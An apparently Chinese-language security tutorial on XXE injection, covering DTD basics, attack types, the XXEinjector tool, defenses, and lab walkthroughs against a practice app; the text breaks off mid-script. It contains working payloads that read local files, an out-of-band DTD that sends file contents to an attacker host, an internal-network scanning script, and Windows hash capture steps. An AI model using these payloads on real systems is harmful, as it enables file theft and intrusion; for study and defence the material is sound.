+++
title = "XXE-XML注入"
date = 2021-06-17

[taxonomies]
categories = ["安全"]
+++

# XML+DTD的基本使用方法
## 什么是XML

- XML指可扩展标记语言（EXtensible Markup Language）
- XML是一种很像HTML的标记语言
- XML的设计宗旨是传输数据，而不是显示数据
- XML标签没有被预定义，需要自行定义标签
- XML被设计为具有自我描述性
- XML是W3C的推荐标准
- <!-- more -->

![截屏2021-06-17 下午4.07.53.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623917284931-12f801e6-99f2-4b30-bdad-580eed973657.png#align=left&display=inline&height=292&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.07.53.png&originHeight=744&originWidth=836&size=398015&status=done&style=none&width=328)<br />需要注意的是：XML不会做任何事情，它仅仅是包装在XML标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。
## XML用途

- 简化数据共享
- 简化数据传输
- 简化平台变更
- 使数据更加有用
## 什么是DTD
定义：DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。<br />作用：

1. 一个应用程序也可以使用DTD来确认从DTD收到的数据是有效的
1. 每个XML文件可以携带一个自身格式的描述
1. 不同组织的人可以使用一个通用DTD来交换数据
## DTD分类
内部DTD<br />![截屏2021-06-17 下午4.23.21.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918218039-510d635d-1ae1-4ff6-97be-a1b75a8f5137.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.23.21.png&originHeight=552&originWidth=1038&size=448655&status=done&style=none&width=462)<br />外部DTD<br />![截屏2021-06-17 下午4.24.20.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918272629-dc623c1d-7055-48a7-ba3b-ac3d9f93bf03.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.24.20.png&originHeight=552&originWidth=1300&size=525269&status=done&style=none&width=463)<br />公有DTD<br />![截屏2021-06-17 下午4.25.30.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918341001-e4dcf711-500b-4cef-874f-1bf73dbeff47.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.25.30.png&originHeight=124&originWidth=2448&size=322609&status=done&style=none&width=792)
## DTD实体
内部实体<br /><!ENTITY 实体名称 "实体的值"><br />![截屏2021-06-17 下午4.30.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918660673-8aac5b03-0174-43bd-9f7a-c938d4d46e5a.png#align=left&display=inline&height=120&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.30.48.png&originHeight=282&originWidth=896&size=196818&status=done&style=none&width=381)<br />外部实体<br /><!ENTITY 实体名称 SYSTEM "URL"><br />![截屏2021-06-17 下午4.32.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918777670-f60a9a13-df29-49c4-8b8a-24acd0115652.png#align=left&display=inline&height=136&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.32.44.png&originHeight=310&originWidth=868&size=227080&status=done&style=none&width=380)<br />参数实体<br /><!ENTITY % 实体名称 [SYSTEM] "URL"><br />![截屏2021-06-17 下午4.34.25.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918874001-9a7c61b3-93cd-4f5f-b4e7-d2ef04d7bab8.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.34.25.png&originHeight=208&originWidth=1032&size=134757&status=done&style=none&width=381)

1. 参数实体只能在DTD中定义，DTD中引用
1. 参数实体和通用实体一样，参数实体也可以外部引用
1. 实体的声明中不能引用其他参数实体
1. 非参数实体只能在DTD中定义，在xml文档中引用
## DTD元素
![截屏2021-06-17 下午4.44.55.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919505307-0ebe69ed-fbd4-4b9f-b55e-7be384f2b15b.png#align=left&display=inline&height=960&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.44.55.png&originHeight=960&originWidth=2186&size=400979&status=done&style=none&width=2186)
## DTD的使用
![截屏2021-06-17 下午4.47.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919725924-3036e7cc-093c-470d-b0a5-cb79d90ca0dc.png#align=left&display=inline&height=614&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.47.48.png&originHeight=1246&originWidth=1128&size=1072736&status=done&style=none&width=556)<br />![截屏2021-06-17 下午4.48.03.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919749398-2ecc4d9e-726c-4224-9099-a322c3db1eae.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.03.png&originHeight=724&originWidth=1264&size=592639&status=done&style=none&width=560)<br />![截屏2021-06-17 下午4.48.33.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919775613-1fd20acd-9959-4e37-9241-35ed837b3323.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.33.png&originHeight=416&originWidth=1260&size=340665&status=done&style=none&width=558)
# XXE漏洞原理
XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。如果开发人员在开发时允许引用外部实体时，恶意用户便会利用这一漏洞构造恶意语句，从而引发文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，可见其危害之大。<br />![截屏2021-06-17 下午7.36.27.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623929799912-1e4bc587-ea73-4bf7-ad88-4d0e9740030b.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.36.27.png&originHeight=560&originWidth=1064&size=287717&status=done&style=none&width=414)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624115596592-0a5c9513-a254-4e49-8784-91590dd5297a.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&name=image.png&originHeight=519&originWidth=857&size=142117&status=done&style=none&width=417)<br />**XXE注入的主要利用点是 ****外部实体**
# XXE漏洞分类（按构造外部实体声明）

1. 直接通过DTD外部实体声明

![截屏2021-06-17 下午7.41.30.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930146397-482d3699-2356-404b-a16a-afd691668fb4.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.30.png&originHeight=368&originWidth=1568&size=274496&status=done&style=none&width=427)<br />Margin.dtd文件内容<br /><!ENTITY f SYSTEM "file:///etc/passwd">

2. 通过DTD文档引入外部DTD文档中的外部实体声明

![截屏2021-06-17 下午7.41.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930314869-205ecb8e-c744-4300-8316-44bb1bac4ef3.png#align=left&display=inline&height=49&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.48.png&originHeight=186&originWidth=2256&size=289702&status=done&style=none&width=593)

3. 通过DTD外部实体声明引入外部文档中的外部实体声明

![截屏2021-06-17 下午7.42.05.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930404422-ab134fca-613d-4cc7-afe3-03a272283dbb.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.42.05.png&originHeight=324&originWidth=2068&size=348584&status=done&style=none&width=502)
# XXE漏洞分类

1. 正常回显XXE

正常回显XXE是最传统的XXE攻击，在利用过程中服务器会直接回显信息，可直接完成XXE攻击。

2. 报错XXE

报错XXE是回显XXE攻击的一种特例，它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息的不同判断是否注入成功。

3. Blind XXE

当服务器没有回显，我们可以选择使用Blind XXE。与前两种XXE不同之处在于Blind XXE无回显信息，可组合利用file协议来读取文件或http协议和ftp协议来查看日志
# XXE的危害
## 读取任意文件
PHP中可以通过file协议、http协议和ftp协议读取文件，还可以利用PHP伪协议。<br />![截屏2021-06-17 下午8.13.49.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932049221-ca0e87d9-73af-4838-a183-d1b13166e17e.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.13.49.png&originHeight=356&originWidth=1566&size=298968&status=done&style=none&width=454)<br />![截屏2021-06-17 下午8.14.40.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932094518-1443e3c4-c78f-40c8-9566-6f91f75d0fff.png#align=left&display=inline&height=155&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.14.40.png&originHeight=582&originWidth=1694&size=1594704&status=done&style=none&width=452)
## 执行系统命令
这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。<br />![截屏2021-06-17 下午8.21.11.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932484573-1c34c559-5b41-4cde-b504-547c3ee52655.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.21.11.png&originHeight=362&originWidth=1316&size=290238&status=done&style=none&width=452)
## 内网端口探测
可根据返回信息内容判断该端口是否打开。若测试端口返回“Connection refused”，则可以知道该端口是closed的，否则为open。<br />![截屏2021-06-17 下午8.24.33.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932694797-eca2f894-7abc-4d8e-8875-d17ad08dbf3b.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.24.33.png&originHeight=570&originWidth=1926&size=520421&status=done&style=none&width=454)
## jar协议上传文件
jar协议语法    jar:{url}!/{entry}<br />url是文件的路径，entry是想要解压出来的文件<br />jar协议处理文件的过程：下载jar/zip文件到临时文件中提取出我们指定的文件删除临时文件<br />![截屏2021-06-17 下午8.33.09.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623933204568-64d2740d-9839-4d08-8965-a5006dc6ef75.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.33.09.png&originHeight=338&originWidth=2276&size=413186&status=done&style=none&width=518)
# XXE利用工具-XXEinjector
![截屏2021-06-17 下午8.36.34.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623933410378-67e801c6-ec16-4d57-8bcc-3f34ce3e980a.png#align=left&display=inline&height=1270&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.36.34.png&originHeight=1270&originWidth=2566&size=1133272&status=done&style=none&width=2566)
```shell
--host           必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
--file           必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
--logger         记录输出结果。
--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
--rport          远程主机的TCP端口信息。(--rport=8080)
--phpfilter      在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
--netdoc         使用netdoc协议。(Java).
--enumports      枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
--hashes         窃取运行当前应用程序用户的Windows哈希。
--expect         使用PHP expect扩展执行任意系统命令。(--expect=ls)
--upload         使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
--xslt           XSLT注入测试。
--ssl            使用SSL。
--proxy          使用代理。(--proxy=127.0.0.1:8080)
--httpport       自定义HTTP端口。(--httpport=80)
--ftpport        设置自定义FTP端口。(--ftpport=21)
--gopherport     设置自定义gopher端口。(--gopherport=70)
--jarport        设置自定义文件上传端口。(--jarport=1337)
--xsltport       设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
--test           该模式可用于测试请求的有效。
--urlencode      URL编码，默认为URI。
--output         爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
--timeout        设置接收文件/目录内容的Timeout。(--timeout=20)
--contimeout     设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
--fast           跳过枚举询问，有可能出现结果假阳性。
--verbose        显示verbose信息。
一、读取文件：
ruby XXEinjector.rb --host=192.168.0.110 --path=c:/flag.txt --httpport=80 --file=req.txt --verbose --oob=http --phpfilter
二、获取Windows 用户Hash
1、启动msf，执行use auxiliary/server/capture/smb ,set johnpwfile /tmp/john, run
2、执行： ruby XXEinjector.rb --host=192.168.0.110  --file=req.txt --hashes --verbose
3、查看/tmp/john中的Hash
4、执行命令破解：john --format=netntlmv2 /tmp/john，或john /tmp/john_netntlm --format=netntlm
三、目录浏览：
ruby XXEinjector.rb --host=10.2.7.180 --path=c:/ --file=req3.txt --verbose
```
# XXE防御
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC<br />PHP下<br />libxml_disable_entity_loader(true);<br />python下<br />from lxml import etree<br />xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br />Java下<br />![截屏2021-06-17 下午8.48.34.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623934129947-82a4b1eb-eae4-44c4-b71b-710f937da0b7.png#align=left&display=inline&height=1142&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.48.34.png&originHeight=1142&originWidth=2032&size=741526&status=done&style=none&width=2032)
# XXE漏洞实战
## PHP语言下的XXE漏洞实战
环境：[c0ny1](http://gv7.me/)的xxe-lab<br />![截屏2021-06-18 上午2.11.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623953489264-c04a8a17-b83b-42ac-ba80-a32475cfb9a1.png#align=left&display=inline&height=1666&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.11.16.png&originHeight=1666&originWidth=2536&size=385603&status=done&style=none&width=2536)<br />目标<br />寻找C盘下的flag

首先利用burp抓包<br />![截屏2021-06-18 上午2.14.20.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623953683517-891b61c7-f7ff-4eb6-8792-ba7da301bc1c.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.14.20.png&originHeight=1750&originWidth=2696&size=483256&status=done&style=none&width=2696)<br />在repeater中改包发包<br />发送包修改为如下
```xml
POST /php_xxe/doLogin.php HTTP/1.1
Host: 192.168.43.231
Content-Length: 158
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.231
Referer: http://192.168.43.231/php_xxe/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version='1.0'?>
<!DOCTYPE user[
<!ENTITY baz SYSTEM "file:///c:/flag.txt">
]>
<user><username>admin&baz;</username><password>admin</password></user>
```
成功得到flag内容<br />![截屏2021-06-18 上午2.56.41.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623956215547-e0b7c5d0-2a6b-4723-9943-8b09eb5111e9.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.56.41.png&originHeight=1750&originWidth=2696&size=661785&status=done&style=none&width=2696)<br />后台源码<br />![截屏2021-06-18 上午3.19.43.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623957654248-590a87a0-3da1-4d7a-995a-2239d6ba891b.png#align=left&display=inline&height=1196&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%883.19.43.png&originHeight=1196&originWidth=1532&size=345572&status=done&style=none&width=1532)
## XXE漏洞读取有特殊字符的文件
上面所述的flag文件中的字符都是普通字符，如果flag文件中的内容为一段PHP代码，则无法输出。例如，文件的内容为flag{<?php phpinfo();?>}，则只会输出flag{}。<br />所以需要用到CDATA<br />被`<![CDATA[]]>`这个标记所包含的内容将表示为**纯文本**，比如`<![CDATA[<]]>`表示文本内容`<`。<br />此标记用于xml文档中，我们先来看看使用转义符的情况。我们知道，在xml中，`<`、`>`、`&`等字符是不能直接存入的，否则xml语法检查时会**报错**，如果想在xml中使用这些符号，必须将其转义为实体，如`&lt;`、`&gt;`、`&amp;`，这样才能保存进xml文档。<br />在使用程序读取的时候，解析器会自动将这些实体转换回`<`、`>`、`&`。

那么如何读取存在特殊字符的文件呢？<br />首先，写下如下代码
```xml
<?xml version="1.0" encoding="utf-8"?>
<ENTITY all "%start;%baz;%stop;"
```
再将这段代码命名为blaze.dtd，并上传到另一台服务器，这里以 Kali Linux 为例<br />![截屏2021-06-18 上午7.49.01.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623973757345-d4a35c15-908f-4d99-8cb9-6ea6d7232c14.png#align=left&display=inline&height=97&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.49.01.png&originHeight=180&originWidth=824&size=82233&status=done&style=none&width=443)<br />输入<br />python -m http.server    启动监听<br />![截屏2021-06-18 上午7.51.27.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623973899142-c3cad7e7-a0b9-4045-a34e-699787478abd.png#align=left&display=inline&height=54&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.51.27.png&originHeight=118&originWidth=970&size=64864&status=done&style=none&width=443)<br />将发送报文修改为如下
```xml
POST /php_xxe/doLogin.php HTTP/1.1
Host: 192.168.43.231
Content-Length: 297
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.231
Referer: http://192.168.43.231/php_xxe/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version='1.0' encoding="utf-8"?>
<!DOCTYPE user[
<!ENTITY % baz SYSTEM "file:///c:/flag.txt">
<!ENTITY % start "<![CDATA[">
<!ENTITY % stop "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.43.147:8000/blaze.dtd">
%dtd;
]>
<user><username>&all;</username><password>admin</password></user>
```
发包后，kali处也接到请求<br />![截屏2021-06-18 上午7.54.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623974094378-18f32fa0-a4fe-48a6-a505-56634fc7231e.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.54.44.png&originHeight=146&originWidth=1194&size=98447&status=done&style=none&width=462)<br />与此同时，收到的回复包中，也已经显示出了带有特殊字符内容的flag文件的内容<br />![截屏2021-06-18 上午7.57.22.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623974258932-818b89ba-1a7f-457a-a2c7-9a7844ce4add.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.57.22.png&originHeight=1750&originWidth=2696&size=663742&status=done&style=none&width=2696)
## XXE无回显读取敏感文件
无回显的情况下，可以让目标服务器（携带flag）向我们自己的一台服务器发起请求，在请求中携带自己内部的flag<br />首先在我们自己的服务器上存储如下内容的一个文件
```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.147/?content=%file;'>">%payload;
```
其中 &#x25 是 % 的html编码，作为payload的实体内容，有双引号包裹下，必须用html编码形式，因为实体的值中不能有 %<br />这里使用“实体定义作为另一个实体定义下的实体内容”的形式来实现<br />另外，其中的IP地址 192.168.43.147 即是此文件所在服务器的IP地址

启动我们服务器的监听<br />将发送报文改为如下内容
```xml
POST /php_xxe/doLogin.php HTTP/1.1
Host: 192.168.43.231
Content-Length: 286
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.231
Referer: http://192.168.43.231/php_xxe/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/flag.txt">
<!ENTITY % dtd SYSTEM "http://192.168.43.147/evil.xml">
%dtd;
%send;
]>
<user><username>admin</username><password>admin</password></user>
```
其参数实体的调用为：首先在报文中调用dtd实体，dtd实体存在于我们的服务器，dtd实体中调用payload实体，而payload实体为 对send实体的定义，这样便从我们的服务器导入了send实体的定义，最后在报文中调用send实体，send实体的内容为 向我们的服务器发起GET请求，请求的内容为file实体，以此将file实体中的文件内容通过GET请求发送到我们的服务器。<br />![截屏2021-06-19 下午5.32.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095155024-a55f5eb3-e70b-4339-9cee-53836c276bf3.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.32.16.png&originHeight=1750&originWidth=2696&size=1558301&status=done&style=none&width=2696)<br />（本图回复包中的报错还没有搞清楚……正常的回复包应该只有包头，不过也可以看到，在回复包的报错中也爆出了请求的内容）<br />可以看到，在发出请求包之后，我们的服务器马上收到了带有GET请求内容的请求包<br />![截屏2021-06-19 下午5.36.55.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095426851-005374ea-5a69-43e5-b1d9-55084f2b36fc.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.36.55.png&originHeight=222&originWidth=1290&size=159149&status=done&style=none&width=1290)<br />最后将收到的内容进行base64解码，即可得到flag值<br />![截屏2021-06-19 下午5.38.57.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095550592-60bb7dba-8cfc-4fb9-96e7-eacb210de7ed.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.38.57.png&originHeight=1750&originWidth=2696&size=346635&status=done&style=none&width=2696)<br />![截屏2021-06-19 下午5.39.31.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095585953-f94f217b-3dbf-413b-86a2-68840c5e6af8.png#align=left&display=inline&height=410&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.39.31.png&originHeight=410&originWidth=722&size=75769&status=done&style=none&width=722)
## XXE探测内网端口
这里利用XXE作为跳板，向目标主机所在内网发送请求，看是否有回应<br />这里引用笔记最后推荐的一篇好文章的探测内网的部分

我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了

**下面是一个探测脚本的实例：**
```python
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```
**返回结果：**<br />**![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624120165579-f2e65864-56ba-422c-a6af-4aad3acf262e.png#align=left&display=inline&height=311&margin=%5Bobject%20Object%5D&name=image.png&originHeight=311&originWidth=902&size=259745&status=done&style=none&width=902)**<br />**<br />找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测<br />**<br />**比如我们传入：**
```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>4</data>
```
**返回结果：**
```shell
javax.xml.bind.UnmarshalException  
 - with linked exception:
[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document  
Internal Exception: ████████████████████████: Connection refused
```


这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测

**如下图所示：**<br />**![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624120397352-2d1f2223-3687-4ee9-90c6-2d56e3af07d6.png#align=left&display=inline&height=379&margin=%5Bobject%20Object%5D&name=image.png&originHeight=379&originWidth=884&size=84940&status=done&style=none&width=884)**<br />至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）
## Java项目XXE漏洞获取服务器密码
不知道为什么，metasploit无法捕获，已经尝试两天了，决定放弃了，以后再看看吧……
##  Java中jar协议上传文件
通过xxe读取文件目录<br />（tomcat下的XXE.war环境）<br />抓包改包，将发送包改为如下：
```xml
POST /XXE/doLogin HTTP/1.1
Host: 192.168.43.231:8080
Content-Length: 167
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.231:8080
Referer: http://192.168.43.231:8080/XXE/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user[
<!ENTITY baz SYSTEM "file:///c:/">
]>
<user><username>admin&baz;</username><password>admin</password></user>
```
即可在回复包中得到c盘的文件目录<br />![截屏2021-06-21 下午11.51.53.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624290735854-36bbf5e6-1885-41f1-b8c1-42354e789e46.png#align=left&display=inline&height=1762&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-21%20%E4%B8%8B%E5%8D%8811.51.53.png&originHeight=1762&originWidth=2696&size=608846&status=done&style=none&width=2696)<br />若要查看子目录，只要更改目录即可。

---

通过jar协议上传文件（如下实验需要一台远程服务器，这里为kali）<br />**在kali主机内进行如下操作**<br />首先需要使用一个python脚本来开启服务，脚本如下：<br />
```python
import sys 
import time 
import threading 
import socketserver 
from urllib.parse import quote 
import http.client as httpc 

listen_host = '192.168.0.110' 
listen_port = 9999 
jar_file = sys.argv[1]

class JarRequestHandler(socketserver.BaseRequestHandler):  
    def handle(self):
        http_req = b''
        print('New connection:',self.client_address)
        while b'\r\n\r\n' not in http_req:
            try:
                http_req += self.request.recv(4096)
                print('Client req:\r\n',http_req.decode())
                jf = open(jar_file, 'rb')
                contents = jf.read()
